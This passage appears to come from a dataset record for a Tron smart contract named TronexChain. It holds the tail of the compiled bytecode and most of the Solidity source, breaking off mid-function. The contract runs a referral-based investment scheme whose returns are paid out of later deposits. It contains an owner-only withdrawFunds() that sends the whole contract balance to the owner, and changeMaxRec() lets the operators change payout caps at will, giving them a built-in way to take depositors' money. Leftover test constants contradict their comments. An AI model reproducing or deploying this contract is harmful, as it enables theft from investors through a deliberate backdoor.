ffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015401111561240a57600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154810391505b5b80600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015410801561249e57506000600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154115b15612585576000600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015490508181600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015401111561257e57600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b8083019250505b80600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015410801561261857506000600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154115b156126ff576000600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004015490508181600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201540111156126f857600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b8083019250505b80600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201541015156127555760009250505061275b565b81925050505b919050565b600881565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16148061280d5750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515612881576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b8060048190555050565b607881565b600080600090506000809050600062989680600c548115156128ae57fe5b0490506032811115156128ca57600281029250600091506128e4565b606492506002606460028302038115156128e057fe5b0491505b600082840190508060780194505050505090565b6298968081565b6000803073ffffffffffffffffffffffffffffffffffffffff16638959af3c600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b1580156129b157600080fd5b505afa1580156129c5573d6000803e3d6000fd5b505050506040513d60208110156129db57600080fd5b8101908080519060200190929190505050905060006129f86134b2565b905081600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601541015612bdb57600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015461271060b4600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff1664ffffffffff164203811515612af257fe5b0483600860008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501540202811515612b4257fe5b040392508183600860008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154011115612bda57600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154820392505b5b50915091565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000806000806000600860008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010154600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080154600860008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060090154600860008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a0154600860008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b01549450945094509450945091939590929450565b60065481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480612e415750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b80612e995750600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515612f0d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000806004541115612f755760646004548302811515612f6d57fe5b049050612f89565b606461012c8302811515612f8557fe5b0490505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16148061305b5750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b15156130cf576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600d5481565b60045481565b60086020528060005260406000206000915090508060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060010154908060020154908060030154908060040154908060050154908060060154908060070160009054906101000a900464ffffffffff169080600801549080600901549080600a01549080600b01549080600c015490508d565b6009818154811015156131c457fe5b906000526020600020016000915090505481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600a8181548110151561320d57fe5b9060005260206000209060209182820401919006915054906101000a900460ff1681565b600042905090565b60055481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614806132e75750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b8061333f5750600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b15156133b3576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b80600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080600090506000809050600062989680600c5481151561343b57fe5b0490506032811115156134575760028102925060009150613471565b6064925060026064600283020381151561346d57fe5b0491505b600082840190508094505050505090565b600c5481565b6298968081565b600b5481565b61349f3382613798565b6134a93334613bd6565b50565b60075481565b600080600090506000809050600062989680600c548115156134d057fe5b0490506032811115156134ec5760028102925060009150613506565b6064925060026064600283020381151561350257fe5b0491505b600082840190508060780194505050505090565b6000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b600a805490508160ff16101561379257600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156135d157613792565b6001810160ff16600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600101541015156137205760006064600a8360ff1681548110151561363857fe5b90600052602060002090602091828204019190069054906101000a900460ff1660ff16850281151561366657fe5b04905080600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600401600082825401925050819055508473ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f16e746f9be6c4b545700b04df27afb9fceabf59b94ef1c816e78a435059fabea836040518082815260200191505060405180910390a3505b600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508080600101915050613587565b50505050565b600073ffffffffffffffffffffffffffffffffffffffff16600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614801561386257508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614155b80156138bb57506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b801561397857506000600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff1664ffffffffff16118061397757506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b5b15613bd25780600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600860008273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600101600081548092919060010191905055508073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167f9f4d150e5193cfa9a87226111d3b60b624d97ccc056eeeac1569af1ea27bf64160405160405180910390a3600b6000815480929190600101919050555060008090505b600a805490508160ff161015613bd057600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415613b0c57613bd0565b600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a0160008154809291906001019190505550600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508080600101915050613ac2565b505b5050565b600073ffffffffffffffffffffffffffffffffffffffff16600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141580613cc057506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b1515613d34576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260098152602001807f4e6f2075706c696e65000000000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff1664ffffffffff161115613ff9573073ffffffffffffffffffffffffffffffffffffffff16638959af3c600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b158015613e4657600080fd5b505afa158015613e5a573d6000803e3d6000fd5b505050506040513d6020811015613e7057600080fd5b8101908080519060200190929190505050600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015410151515613f3a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f4465706f73697420616c7265616479206578697374730000000000000000000081525060200191505060405180910390fd5b600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501548110151515613ff4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b614075565b629896808110151515614074576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b5b6000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002018190555080600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501819055506000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601819055506001600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c018190555042600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160006101000a81548164ffffffffff021916908364ffffffffff16021790555080600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206008016000828254019250508190555080600c600082825401925050819055508173ffffffffffffffffffffffffffffffffffffffff167f2cb77763bc1e8490c1a904905c4d74b4269919aca114464f4bb4d911e60de364826040518082815260200191505060405180910390a26000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b6001600554038160ff16101561441e57600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561435c5761441e565b82600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0160008282540192505081905550600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508080600101915050614312565b50600073ffffffffffffffffffffffffffffffffffffffff16600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614151561464f576064600883028115156144c657fe5b0460086000600860008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff16600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fba5b08f0cddc64825b52c35c09323af810c1d2e29c97aba01a4ed25cfdc482d160646008860281151561463857fe5b046040518082815260200191505060405180910390a35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e8600654850281151561469b57fe5b049081150290604051600060405180830381858888f193505050501580156146c7573d6000803e3d6000fd5b50600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e8600754850281151561471557fe5b049081150290604051600060405180830381858888f19350505050158015614741573d6000803e3d6000fd5b50600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e8600754850281151561478f57fe5b049081150290604051600060405180830381858888f193505050501580156147bb573d6000803e3d6000fd5b5050505056fea165627a7a723058208e9ad9b5387edeffda79b8b879f1223bb865d76abe08a72dfd3eaca86193e72f0029",
  "source": "pragma solidity 0.5.4;\r\n\r\ncontract TronexChain {\r\n\r\n    struct User {\r\n        address upline;\r\n        uint256 referrals;\r\n        uint256 payouts;\r\n        uint256 direct_bonus;\r\n        uint256 gen_bonus;\r\n        uint256 deposit_amount;\r\n        uint256 deposit_payouts;\r\n        uint40 deposit_time;\r\n        uint256 total_deposits;\r\n        uint256 total_payouts;\r\n        uint256 total_structure;\r\n\t\tuint256 team_biz;\r\n        uint256 isActive;\r\n    }\r\n\r\n    address payable public owner;\r\n    address payable public alt_owner;\r\n    address payable public fee1;\r\n    address payable public fee2;\r\n\tuint256 public max_receivable  = 0;\r\n \r\n    uint256 constant public CONTRACT_BALANCE_STEP = 10 trx; // 1000000 trx\r\n    uint256 constant public MIN_DEPOSIT = 10 trx; // 50 trx\r\n    uint256 constant public BASE_PERCENT = 120 ; // 0.1% => 1 unit, 1.2% daily (MULTIPLIER 100)\r\n\tuint256 constant public PERCENTS_DIVIDER = 10000; \r\n    uint256 constant public TIME_STEP = 180 ; // 1 days\r\n    uint256 constant public aff_bonus = 8 ; // 8 percent\r\n \tuint256 public team_levels = 30 ;\r\n    uint256 public promo_fee  = 100 ;   \r\n    uint256 public admin_fee  = 25  ;   \r\n  \r\n    mapping(address => User) public users;\r\n\r\n    uint256[] public cycles;\r\n    uint8[] public ref_bonuses;                     // 1 => 1% \r\n\r\n    uint256 public total_users = 1;\r\n    uint256 public total_deposited;\r\n    uint256 public total_withdraw;\r\n    \r\n    event Upline(address indexed addr, address indexed upline);\r\n    event NewDeposit(address indexed addr, uint256 amount);\r\n    event DirectPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event Withdraw(address indexed addr, uint256 amount);\r\n    event LimitReached(address indexed addr, uint256 amount);\r\n\r\n    constructor(address payable _owner, address payable _alt_owner, address payable _fee1, address payable _fee2) public {\r\n        owner = _owner;\r\n\t\talt_owner = _alt_owner;\r\n        fee1 = _fee1;\r\n        fee2 = _fee2;\r\n         \r\n        ref_bonuses.push(30);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);  //50\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);  //25\r\n        \r\n    }\r\n \r\n    function _setUpline(address _addr, address _upline) private {\r\n        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && \r\n\t\t(users[_upline].deposit_time > 0 || _upline == owner) ) {\r\n            users[_addr].upline = _upline;\r\n            users[_upline].referrals++;\r\n\r\n            emit Upline(_addr, _upline);\r\n\r\n            total_users++;\r\n\r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].total_structure++;\r\n\r\n                _upline = users[_upline].upline;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _deposit(address _addr, uint256 _amount) private {\r\n        require(users[_addr].upline != address(0) || _addr == owner, \"No upline\");\r\n\r\n        if(users[_addr].deposit_time > 0) {\r\n             \r\n            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), \"Deposit already exists\");\r\n            require(_amount >= users[_addr].deposit_amount  , \"Bad amount\");\r\n        }\r\n        else require(_amount >= MIN_DEPOSIT  , \"Bad amount\");\r\n        \r\n        users[_addr].payouts = 0;\r\n        users[_addr].deposit_amount = _amount;\r\n        users[_addr].deposit_payouts = 0;\r\n        users[_addr].isActive = 1;\r\n        users[_addr].deposit_time = uint40(block.timestamp);\r\n        users[_addr].total_deposits += _amount;\r\n \r\n        total_deposited += _amount;\r\n        \r\n        emit NewDeposit(_addr, _amount);\r\n\r\n\t\taddress _upline = users[_addr].upline;\r\n\r\n\t\t for(uint8 i = 0; i < team_levels - 1; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].team_biz += _amount; \r\n                _upline = users[_upline].upline;\r\n            }\r\n\r\n        if(users[_addr].upline != address(0)) {\r\n            users[users[_addr].upline].direct_bonus += _amount*aff_bonus/100;\r\n\r\n            emit DirectPayout(users[_addr].upline, _addr,  _amount*aff_bonus/100);\r\n        } \r\n         \r\n         owner.transfer(_amount * promo_fee / 1000); \r\n         fee1.transfer(_amount * admin_fee / 1000); \r\n         fee2.transfer(_amount * admin_fee / 1000); \r\n    }\r\n\r\n     function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = users[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            if(users[up].referrals >= i + 1) {\r\n                uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n                \r\n                users[up].gen_bonus += bonus;\r\n\r\n                emit MatchPayout(up, _addr, bonus);\r\n            }\r\n\r\n            up = users[up].upline;\r\n        }\r\n    }\r\n \r\n    function deposit(address _upline) payable external {\r\n        _setUpline(msg.sender, _upline);\r\n        _deposit(msg.sender, msg.value);\r\n    }\r\n\r\n \r\n    function withdraw() external {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);\r\n        \r\n        require(users[msg.sender].payouts < max_payout, \"Full payouts\");\r\n\r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[msg.sender].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].deposit_payouts += to_payout;\r\n            users[msg.sender].payouts += to_payout;\r\n\r\n            _refPayout(msg.sender, to_payout);\r\n        }\r\n        \r\n        // Direct payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[msg.sender].direct_bonus;\r\n\r\n            if(users[msg.sender].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].direct_bonus -= direct_bonus;\r\n            users[msg.sender].payouts += direct_bonus;\r\n            to_payout += direct_bonus;\r\n        } \r\n       \r\n        // Match payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[msg.sender].gen_bonus;\r\n\r\n            if(users[msg.sender].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].gen_bonus -= gen_bonus;\r\n            users[msg.sender].payouts += gen_bonus;\r\n            to_payout += gen_bonus;\r\n        }\r\n\r\n        require(to_payout > 0, \"Zero payout\");\r\n        \r\n        users[msg.sender].total_payouts += to_payout;\r\n        total_withdraw += to_payout;\r\n\r\n        msg.sender.transfer(to_payout);\r\n\r\n        emit Withdraw(msg.sender, to_payout);\r\n\r\n        if(users[msg.sender].payouts >= max_payout) {\r\n            emit LimitReached(msg.sender, users[msg.sender].payouts);\r\n            users[msg.sender].isActive = 0;\r\n        }\r\n    }\r\n    \r\n    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {\r\n        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n\t\tuint256 total_rate = getTotalRate();\r\n\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n    }\r\n\r\n    function getUserDividends(address _addr) view external returns(uint256) {\r\n      uint256  max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n      uint256 total_rate = getTotalRate();\r\n      uint256 payout;\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n        return payout;\r\n    }   \r\n \r\n\tfunction getTotalRate() internal view returns(uint256) {\r\n\t \r\n \t\tuint256 step1 = 0;\r\n\t\tuint256 step2 = 0;\r\n\t\tuint256 steps =  total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n\r\n\t\treturn BASE_PERCENT+total_step ;\r\n\t}\r\n\r\n    /*\r\n        Only external call\r\n    */\r\n\r\n\r\n\tfunction getContractBalance() public view returns (uint256) {\r\n\t\treturn address(this).balance;\r\n\t} \r\n\r\n    function getTotalSteps( uint256 _balance) external pure returns(uint256) {\r\n     \r\n        uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 balance_trx = _balance*1000000; \r\n        uint256 steps =  balance_trx/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n \r\n        return total_step ;\r\n    }\r\n\r\n\r\n\tfunction getRate() external view returns(uint256) {\r\n\t \r\n        uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 steps =  total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n         \r\n        return BASE_PERCENT+total_step ;\r\n\t}\r\n\r\n    function getContractBonus() external view returns(uint256) {\r\n     \r\n         uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 steps = total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2; \r\n        return total_step ;\r\n    }\r\n\r\n\r\n    function maxPayoutOf(uint256 _amount) external view returns(uint256) {\r\n\t\tif(max_receivable > 0){\r\n\t\t\treturn  _amount * max_receivable / 100;\r\n\t\t} else {\r\n        return \t_amount * 300 / 100; \r\n\t\t}\r\n    }\r\n \r\n\r\n\tfunction getUserBalance(address _addr) external view returns (uint256) {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(_addr); \r\n \r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[_addr].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[_addr].payouts;\r\n            } \r\n         }\r\n        \r\n        // Direct payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[_addr].direct_bonus;\r\n\r\n            if(users[_addr].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n           \r\n            to_payout += direct_bonus;\r\n        } \r\n       \r\n        // Match payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[_addr].gen_bonus;\r\n\r\n            if(users[_addr].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n            to_payout += gen_bonus;\r\n        } \r\n \r\n        if(users[_addr].payouts >= max_payout) {\r\n\t\t\treturn 0;       \r\n\t\t } else {\r\n\t\t\t return to_payout;\r\n\t\t }\r\n    }\r\n  \r\n\tfunction changeMaxRec(uint256 _maxRecPercent) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\tmax_receivable = _maxRecPercent;\r\n\t} \r\n\r\n\tfunction withdrawFunds() public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner.transfer(address(this).balance);\r\n\t} \r\n\r\n\tfunction changeAdmin(address payable _newAdmin) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner = _newAdmin;\r\n\t} \r\n \r\n    function changeFee1(address payable _newfee1) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner || msg.sender == fee1  , \"Not allowed\");\r\n\t\tfee1 = _newfee1;\r\n\t} \r\n \r\n    function changeFee2(address payable _newfee2) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner ||  msg.sender == fee2 , \"Not allowed\");\r\n\t\tfee2 = _newfee2;\r\n\t}  \r\n   \r\n    function getAdmin() external view returns (address){ \r\n        return owner;\r\n    } \r\n\r\n     function getNow() external view returns (uint256){ \r\n        return block.timestamp;\r\n    }\r\n\r\n    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 